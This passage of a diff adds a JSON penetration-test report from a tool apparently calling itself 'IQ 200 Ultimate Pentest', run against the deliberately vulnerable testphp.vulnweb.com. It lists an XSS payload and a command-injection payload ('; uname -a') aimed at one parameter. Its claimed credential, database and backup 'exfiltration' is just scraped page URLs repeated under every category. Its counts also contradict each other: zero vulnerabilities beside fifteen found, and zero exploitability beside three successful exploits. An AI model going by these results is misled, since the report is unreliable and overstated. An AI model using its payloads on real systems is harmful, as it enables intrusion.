+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "width",
+            "codeoutsidehtmlislocked": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "codeoutsidehtmlislocked",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "z-index",
+            "codeoutsidehtmlislocked": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "codeoutsidehtmlislocked",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "clsid",
+            "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "codeoutsidehtmlislocked",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "mailto",
+            "codeoutsidehtmlislocked": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "explorer",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "position",
+            "codeoutsidehtmlislocked": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "explorer",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "width",
+            "codeoutsidehtmlislocked": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "explorer",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "z-index",
+            "codeoutsidehtmlislocked": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "explorer",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "clsid",
+            "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "explorer",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "mailto",
+            "codeoutsidehtmlislocked": "wvs@acunetix.com"
+          }
+        }
+      ]
+    },
+    {
+      "type": "XSS",
+      "severity": "high",
+      "payload": "<script>alert(1)</script>",
+      "parameter": "P1_Prod_Version",
+      "session_hijack_possible": false
+    },
+    {
+      "type": "Command Injection",
+      "severity": "critical",
+      "payload": "; uname -a",
+      "parameter": "P1_Prod_Version",
+      "system_info": {},
+      "files_exfiltrated": [
+        {
+          "file": "config_.env",
+          "data": [
+            "template=\"/Templates/main_dynamic_template.dwt.php\"",
+            "codeOutsideHTMLIsLocked=\"false\"",
+            "equiv=\"Content-Type\"",
+            "content=\"text/html;",
+            "charset=iso-8859-2\">"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "credentials",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "config",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "source_code",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "database",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "backups",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        },
+        {
+          "type": "file_discovery",
+          "category": "logs",
+          "files": [
+            "//www.acunetix.com",
+            "/logo.gif",
+            "/Templates/main_dynamic_template.dwt.php",
+            "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+            "//www.w3.org/TR/html4/loose.dtd",
+            "/index.php",
+            "//www.eclectasy.com/Fractal-Explorer/index.html",
+            "/add.swf",
+            "//www.macromedia.com/shockwave/download/index.cgi"
+          ]
+        }
+      ]
+    }
+  ],
+  "evidence": [],
+  "intelligence": {},
+  "risk_assessment": {
+    "overall_score": 60.0,
+    "severity": "Medium",
+    "cvss_base": 6.0,
+    "exploitability": 0,
+    "vulnerability_count": 0,
+    "exploit_count": 3,
+    "critical_findings": 2
+  },
+  "recommendations": [
+    {
+      "priority": "Critical",
+      "issue": "SQL Injection Vulnerability",
+      "recommendation": "Implement parameterized queries and input validation",
+      "affected_parameter": "P1_Prod_Version"
+    },
+    {
+      "priority": "High",
+      "issue": "Cross-Site Scripting (XSS)",
+      "recommendation": "Implement output encoding and Content Security Policy",
+      "affected_parameter": "P1_Prod_Version"
+    },
+    {
+      "priority": "Critical",
+      "issue": "Command Injection Vulnerability",
+      "recommendation": "Never pass user input directly to system commands. Use whitelisting.",
+      "affected_parameter": "P1_Prod_Version"
+    },
+    {
+      "priority": "High",
+      "issue": "General Security Posture",
+      "recommendation": "Implement Web Application Firewall (WAF)",
+      "affected_parameter": "All"
+    },
+    {
+      "priority": "Medium",
+      "issue": "Security Headers",
+      "recommendation": "Add security headers: CSP, X-Frame-Options, HSTS",
+      "affected_parameter": "HTTP Response"
+    }
+  ],
+  "executive_summary": {
+    "target": "http://testphp.vulnweb.com",
+    "test_date": "2025-11-05",
+    "duration": "0.00 seconds",
+    "phases_completed": 14,
+    "vulnerabilities_found": 15,
+    "exploits_successful": 3,
+    "critical_findings": 2,
+    "risk_level": "Medium",
+    "overall_score": 60.0
+  },
+  "technical_details": {
+    "methodology": "IQ 200 Ultimate Pentest - NSA-Level Framework",
+    "phases": [
+      "Target Reconnaissance",
+      "WAF Detection",
+      "Attack Surface Mapping",
+      "Payload Generation",
+      "Vulnerability Scanning",
+      "Automated Exploitation",
+      "SQL Injection & Data Exfiltration",
+      "Command Injection & File Hunting",
+      "XSS & Client-Side Attacks",
+      "Authentication Bypass",
+      "Business Logic Testing",
+      "Post-Exploitation",
+      "Evidence Collection",
+      "Risk Assessment"
+    ],
+    "tools_used": [
+      "NSA-Level Exploitation",
+      "IQ 200 Data Exfiltrator",
+      "IQ 200 File Hunter",
+      "Genetic Payload Engine"
+    ],
+    "total_findings": 15,
+    "evidence_items": 0
+  },
+  "timeline": [],
+  "status": "running"
+}
